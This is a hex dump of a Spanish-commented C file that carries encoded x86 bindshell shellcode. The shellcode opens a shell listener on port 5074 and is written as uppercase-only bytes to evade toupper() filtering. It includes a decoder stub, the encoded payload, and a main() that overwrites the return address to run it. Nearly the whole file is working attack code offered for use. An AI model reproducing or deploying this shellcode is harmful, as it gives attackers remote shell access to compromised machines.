00000000  2f 2a 0d 0a 20 2a 20 42  69 6e 64 73 68 65 6c 6c  |/*.. * Bindshell|
00000010  20 70 75 65 72 74 6f 20  35 30 37 34 20 28 54 4f  | puerto 5074 (TO|
00000020  55 50 50 45 52 20 45 56  41 53 49 4f 4e 29 0d 0a  |UPPER EVASION)..|
00000030  20 2a 20 32 32 36 20 62  79 74 65 73 0d 0a 20 2a  | * 226 bytes.. *|
00000040  20 42 69 6e 64 73 68 65  6c 6c 20 6f 72 69 67 69  | Bindshell origi|
00000050  6e 61 6c 3a 20 4d 61 74  69 61 73 20 53 65 64 61  |nal: Matias Seda|
00000060  6c 6f 20 28 39 32 20 62  79 74 65 73 29 0d 0a 20  |lo (92 bytes).. |
00000070  2a 0d 0a 20 2a 20 4c 61  20 62 69 6e 73 68 65 6c  |*.. * La binshel|
00000080  6c 20 65 73 74 61 20 63  6f 64 69 66 69 63 61 64  |l esta codificad|
00000090  61 20 75 73 61 6e 64 6f  20 32 20 62 79 74 65 73  |a usando 2 bytes|
000000a0  20 70 61 72 61 0d 0a 20  2a 20 72 65 70 72 65 73  | para.. * repres|
000000b0  65 6e 74 61 72 20 31 20  62 79 74 65 20 6f 72 69  |entar 1 byte ori|
000000c0  67 69 6e 61 6c 20 64 65  20 6c 61 20 73 69 67 75  |ginal de la sigu|
000000d0  69 65 6e 74 65 20 66 6f  72 6d 61 3a 0d 0a 20 2a  |iente forma:.. *|
000000e0  20 62 79 74 65 20 6f 72  69 67 69 6e 61 6c 3a 20  | byte original: |
000000f0  30 78 41 42 0d 0a 20 2a  20 30 78 34 31 20 2b 20  |0xAB.. * 0x41 + |
00000100  30 78 41 20 3d 20 30 78  34 42 3b 20 30 78 34 31  |0xA = 0x4B; 0x41|
00000110  20 2b 20 30 78 42 20 3d  20 30 78 34 43 0d 0a 20  | + 0xB = 0x4C.. |
00000120  2a 20 62 79 74 65 20 63  6f 64 69 66 69 63 61 64  |* byte codificad|
00000130  6f 3a 20 5b 30 78 34 42  20 30 78 34 43 5d 0d 0a  |o: [0x4B 0x4C]..|
00000140  20 2a 0d 0a 20 2a 20 62  79 20 54 6f 72 61 0d 0a  | *.. * by Tora..|
00000150  20 2a 2f 0d 0a 0d 0a 23  69 6e 63 6c 75 64 65 20  | */....#include |
00000160  3c 73 74 64 69 6f 2e 68  3e 0d 0a 23 69 6e 63 6c  |<stdio.h>..#incl|
00000170  75 64 65 20 3c 63 74 79  70 65 2e 68 3e 0d 0a 0d  |ude <ctype.h>...|
00000180  0a 63 68 61 72 20 73 68  65 6c 6c 63 6f 64 65 5b  |.char shellcode[|
00000190  5d 20 3d 20 0d 0a 2f 2a  20 5f 73 74 61 72 74 20  |] = ../* _start |
000001a0  2a 2f 0d 0a 22 5c 78 65  62 5c 78 30 32 22 09 09  |*/.."\xeb\x02"..|
000001b0  09 2f 2a 20 6a 6d 70 20  73 68 6f 72 74 20 41 20  |./* jmp short A |
000001c0  20 20 20 20 20 20 20 20  20 2a 2f 0d 0a 0d 0a 2f  |         */..../|
000001d0  2a 20 41 20 2a 2f 0d 0a  22 5c 78 65 62 5c 78 30  |* A */.."\xeb\x0|
000001e0  35 22 09 09 09 2f 2a 20  6a 6d 70 20 73 68 6f 72  |5".../* jmp shor|
000001f0  74 20 43 20 20 20 20 20  20 20 20 20 20 2a 2f 0d  |t C          */.|
00000200  0a 0d 0a 2f 2a 20 42 20  2a 2f 0d 0a 22 5c 78 65  |.../* B */.."\xe|
00000210  38 5c 78 66 39 5c 78 66  66 5c 78 66 66 5c 78 66  |8\xf9\xff\xff\xf|
00000220  66 22 09 09 2f 2a 20 63  61 6c 6c 20 41 20 20 20  |f"../* call A   |
00000230  20 20 20 20 20 20 20 20  20 20 20 20 2a 2f 0d 0a  |            */..|
00000240  0d 0a 2f 2a 20 43 20 2a  2f 0d 0a 22 5c 78 35 66  |../* C */.."\x5f|
00000250  22 09 09 09 09 2f 2a 20  70 6f 70 20 65 64 69 20  |"..../* pop edi |
00000260  20 20 20 20 20 20 20 20  20 20 20 20 20 2a 2f 0d  |             */.|
00000270  0a 22 5c 78 38 31 5c 78  65 66 5c 78 64 66 5c 78  |."\x81\xef\xdf\x|
00000280  66 66 5c 78 66 66 5c 78  66 66 22 09 2f 2a 20 73  |ff\xff\xff"./* s|
00000290  75 62 20 65 64 69 2c 20  30 78 66 66 66 66 66 66  |ub edi, 0xffffff|
000002a0  64 66 20 20 2a 2f 0d 0a  22 5c 78 35 37 22 09 09  |df  */.."\x57"..|
000002b0  09 09 2f 2a 20 70 75 73  68 20 65 64 69 20 20 20  |../* push edi   |
000002c0  20 20 20 20 20 20 20 20  20 20 2a 2f 0d 0a 22 5c  |          */.."\|
000002d0  78 35 65 22 09 09 09 09  2f 2a 20 70 6f 70 20 65  |x5e"..../* pop e|
000002e0  73 69 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |si              |
000002f0  2a 2f 0d 0a 22 5c 78 32  39 5c 78 63 39 22 09 09  |*/.."\x29\xc9"..|
00000300  09 2f 2a 20 73 75 62 20  65 63 78 2c 20 65 63 78  |./* sub ecx, ecx|
00000310  20 20 20 20 20 20 20 20  20 2a 2f 0d 0a 22 5c 78  |         */.."\x|
00000320  38 30 5c 78 63 31 5c 78  62 38 22 09 09 09 2f 2a  |80\xc1\xb8".../*|
00000330  20 61 64 64 20 63 6c 2c  20 30 78 62 38 20 20 20  | add cl, 0xb8   |
00000340  20 20 20 20 20 20 2a 2f  0d 0a 0d 0a 2f 2a 20 62  |      */..../* b|
00000350  75 63 6c 65 20 2a 2f 0d  0a 22 5c 78 38 61 5c 78  |ucle */.."\x8a\x|
00000360  30 37 22 09 09 09 2f 2a  20 6d 6f 76 20 61 6c 2c  |07".../* mov al,|
00000370  20 62 79 74 65 20 5b 65  64 69 5d 20 20 20 2a 2f  | byte [edi]   */|
00000380  0d 0a 22 5c 78 32 63 5c  78 34 31 22 09 09 09 2f  |.."\x2c\x41".../|
00000390  2a 20 73 75 62 20 61 6c  2c 20 30 78 34 31 20 20  |* sub al, 0x41  |
000003a0  20 20 20 20 20 20 20 2a  2f 0d 0a 22 5c 78 63 30  |       */.."\xc0|
000003b0  5c 78 65 30 5c 78 30 34  22 09 09 09 2f 2a 20 73  |\xe0\x04".../* s|
000003c0  68 6c 20 61 6c 2c 20 34  20 20 20 20 20 20 20 20  |hl al, 4        |
000003d0  20 20 20 20 2a 2f 0d 0a  22 5c 78 34 37 22 09 09  |    */.."\x47"..|
000003e0  09 09 2f 2a 20 69 6e 63  20 65 64 69 20 20 20 20  |../* inc edi    |
000003f0  20 20 20 20 20 20 20 20  20 20 2a 2f 0d 0a 22 5c  |          */.."\|
00000400  78 30 32 5c 78 30 37 22  09 09 09 2f 2a 20 61 64  |x02\x07".../* ad|
00000410  64 20 61 6c 2c 20 62 79  74 65 20 5b 65 64 69 5d  |d al, byte [edi]|
00000420  20 20 20 2a 2f 0d 0a 22  5c 78 32 63 5c 78 34 31  |   */.."\x2c\x41|
00000430  22 09 09 09 2f 2a 20 73  75 62 20 61 6c 2c 20 30  |".../* sub al, 0|
00000440  78 34 31 20 20 20 20 20  20 20 20 20 2a 2f 0d 0a  |x41         */..|
00000450  22 5c 78 38 38 5c 78 30  36 22 09 09 09 2f 2a 20  |"\x88\x06".../* |
00000460  6d 6f 76 20 62 79 74 65  20 5b 65 73 69 5d 2c 20  |mov byte [esi], |
00000470  61 6c 20 20 20 2a 2f 0d  0a 22 5c 78 34 36 22 09  |al   */.."\x46".|
00000480  09 09 09 2f 2a 20 69 6e  63 20 65 73 69 20 20 20  |.../* inc esi   |
00000490  20 20 20 20 20 20 20 20  20 20 20 2a 2f 0d 0a 22  |           */.."|
000004a0  5c 78 34 37 22 09 09 09  09 2f 2a 20 69 6e 63 20  |\x47"..../* inc |
000004b0  65 64 69 20 20 20 20 20  20 20 20 20 20 20 20 20  |edi             |
000004c0  20 2a 2f 0d 0a 22 5c 78  34 39 22 09 09 09 09 2f  | */.."\x49"..../|
000004d0  2a 20 64 65 63 20 65 63  78 20 20 20 20 20 20 20  |* dec ecx       |
000004e0  20 20 20 20 20 20 20 2a  2f 0d 0a 22 5c 78 65 32  |       */.."\xe2|
000004f0  5c 78 65 64 22 09 09 09  2f 2a 20 6c 6f 6f 70 20  |\xed".../* loop |
00000500  62 75 63 6c 65 20 20 20  20 20 20 20 20 20 20 20  |bucle           |
00000510  2a 2f 0d 0a 2f 2a 20 53  68 65 6c 6c 63 6f 64 65  |*/../* Shellcode|
00000520  20 63 6f 64 69 66 69 63  61 64 61 20 64 65 20 31  | codificada de 1|
00000530  38 34 20 28 30 78 62 38  29 20 62 79 74 65 73 20  |84 (0xb8) bytes |
00000540  2a 2f 0d 0a 22 44 42 4d  41 46 41 45 41 49 4a 4d  |*/.."DBMAFAEAIJM|
00000550  44 46 41 45 41 46 41 49  4a 4f 42 4c 41 47 47 4d  |DFAEAFAIJOBLAGGM|
00000560  4e 49 41 44 42 4e 43 46  43 47 47 47 49 42 44 4e  |NIADBNCFCGGGIBDN|
00000570  43 45 44 47 47 46 44 49  4a 4f 42 47 4b 42 22 0d  |CEDGGFDIJOBGKB".|
00000580  0a 22 41 46 42 46 41 49  4a 4f 42 4c 41 47 47 4d  |."AFBFAIJOBLAGGM|
00000590  4e 49 41 45 41 49 4a 45  45 43 45 41 45 45 44 45  |NIAEAIJEECEAEEDE|
000005a0  44 4c 41 47 47 4d 4e 49  41 49 44 4d 45 41 4d 46  |DLAGGMNIAIDMEAMF|
000005b0  43 46 43 45 44 4c 41 47  47 4d 4e 49 41 22 0d 0a  |CFCEDLAGGMNIA"..|
000005c0  22 4a 44 49 4a 4e 42 4c  41 44 50 4d 4e 49 41 45  |"JDIJNBLADPMNIAE|
000005d0  42 49 41 50 4a 41 44 48  46 50 47 46 43 47 49 47  |BIAPJADHFPGFCGIG|
000005e0  4f 43 50 48 44 47 49 47  49 43 50 43 50 47 43 47  |OCPHDGIGICPCPGCG|
000005f0  4a 49 4a 4f 44 46 43 46  44 49 4a 4f 22 0d 0a 22  |JIJODFCFDIJO".."|
00000600  42 4c 41 41 4c 4d 4e 49  41 22 3b 0d 0a 0d 0a 69  |BLAALMNIA";....i|
00000610  6e 74 20 6d 61 69 6e 28  76 6f 69 64 29 0d 0a 7b  |nt main(void)..{|
00000620  0d 0a 20 20 20 20 69 6e  74 20 2a 72 65 74 3b 0d  |..    int *ret;.|
00000630  0a 20 20 20 20 63 68 61  72 20 2a 74 3b 0d 0a 0d  |.    char *t;...|
00000640  0a 20 20 20 20 66 6f 72  20 28 74 20 3d 20 73 68  |.    for (t = sh|
00000650  65 6c 6c 63 6f 64 65 3b  20 2a 74 3b 20 74 2b 2b  |ellcode; *t; t++|
00000660  29 0d 0a 20 20 20 20 20  20 20 20 69 66 20 28 69  |)..        if (i|
00000670  73 6c 6f 77 65 72 28 2a  74 29 29 0d 0a 20 20 20  |slower(*t))..   |
00000680  20 20 20 20 20 20 20 20  20 2a 74 20 3d 20 74 6f  |         *t = to|
00000690  75 70 70 65 72 28 2a 74  29 3b 0d 0a 09 0d 0a 20  |upper(*t);..... |
000006a0  20 20 20 72 65 74 3d 28  69 6e 74 20 2a 29 26 72  |   ret=(int *)&r|
000006b0  65 74 20 2b 33 3b 0d 0a  20 20 20 20 70 72 69 6e  |et +3;..    prin|
000006c0  74 66 28 22 53 68 65 6c  6c 63 6f 64 65 20 6c 65  |tf("Shellcode le|
000006d0  6e 67 68 74 3d 25 64 5c  6e 22 2c 73 74 72 6c 65  |nght=%d\n",strle|
000006e0  6e 28 73 68 65 6c 6c 63  6f 64 65 29 29 3b 0d 0a  |n(shellcode));..|
000006f0  20 20 20 20 28 2a 72 65  74 29 20 3d 20 28 69 6e  |    (*ret) = (in|
00000700  74 29 73 68 65 6c 6c 63  6f 64 65 3b 0d 0a 7d     |t)shellcode;..}|
0000070f
